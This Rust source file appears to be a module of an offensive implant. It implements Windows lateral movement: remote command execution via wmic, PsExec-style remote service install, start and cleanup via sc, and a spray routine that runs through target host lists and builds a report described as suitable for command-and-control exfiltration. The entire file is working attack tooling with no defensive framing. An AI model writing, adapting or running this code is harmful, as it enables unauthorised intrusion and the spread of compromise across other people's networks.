//! lateral.rs — lateral movement via SMB/WMI exec + PsExec-style service drop
//!
//! Techniques:
//!   1. wmi_exec(host, cmd)  — WMI Win32_Process::Create over DCOM
//!   2. smb_exec(host, cmd)  — SCM service install + start + cleanup over SMB
//!   3. spray(hosts, cmd)    — iterate target list, try both methods

use std::process::Command;

/// WMI lateral exec via wmic.exe (shells out — no COM registration needed)
pub fn wmi_exec(host: &str, cmd: &str) -> Result<String, String> {
    let out = Command::new("wmic")
        .args([
            "/node:", host,
            "process", "call", "create", cmd,
        ])
        .output()
        .map_err(|e| e.to_string())?;
    let stdout = String::from_utf8_lossy(&out.stdout).to_string();
    let stderr = String::from_utf8_lossy(&out.stderr).to_string();
    if !out.status.success() || stdout.contains("Error") {
        Err(format!("WMI exec failed: {} {}", stdout, stderr))
    } else {
        Ok(stdout)
    }
}

/// SMB/SCM lateral exec — installs a one-shot service, starts it, waits, deletes
/// Requires admin share access to \\host\ADMIN$
pub fn smb_exec(host: &str, binary_path: &str, svc_name: &str) -> Result<String, String> {
    // Create service
    let create = Command::new("sc")
        .args([&format!("\\\\{}", host), "create", svc_name,
               "binPath=", binary_path, "start=", "demand"])
        .output()
        .map_err(|e| e.to_string())?;
    if !create.status.success() {
        return Err(format!("sc create failed: {}",
            String::from_utf8_lossy(&create.stderr)));
    }
    // Start service
    let start = Command::new("sc")
        .args([&format!("\\\\{}", host), "start", svc_name])
        .output()
        .map_err(|e| e.to_string())?;
    // Cleanup — always attempt even if start failed
    let _ = Command::new("sc")
        .args([&format!("\\\\{}", host), "stop", svc_name])
        .output();
    let _ = Command::new("sc")
        .args([&format!("\\\\{}", host), "delete", svc_name])
        .output();
    if start.status.success() {
        Ok(format!("SMB exec ok on {}", host))
    } else {
        Err(format!("sc start failed: {}",
            String::from_utf8_lossy(&start.stderr)))
    }
}

/// Spray a list of targets — WMI first, SMB fallback
/// Returns a report string suitable for C2 exfil
pub fn spray(hosts: &[&str], cmd: &str, binary_path: &str) -> String {
    let mut report = String::new();
    for host in hosts {
        let result = match wmi_exec(host, cmd) {
            Ok(o)  => format!("[WMI OK] {}: {}", host, o.lines().next().unwrap_or("").trim()),
            Err(e) => {
                // Fallback to SMB
                match smb_exec(host, binary_path, "RedCrabSvc") {
                    Ok(o)  => format!("[SMB OK] {}: {}", host, o),
                    Err(e2) => format!("[FAIL] {}: WMI={} SMB={}", host, e, e2),
                }
            }
        };
        report.push_str(&result);
        report.push('\n');
    }
    report
}

/// Parse a newline-separated host list from bytes
pub fn parse_host_list(raw: &[u8]) -> Vec<String> {
    String::from_utf8_lossy(raw)
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect()
}
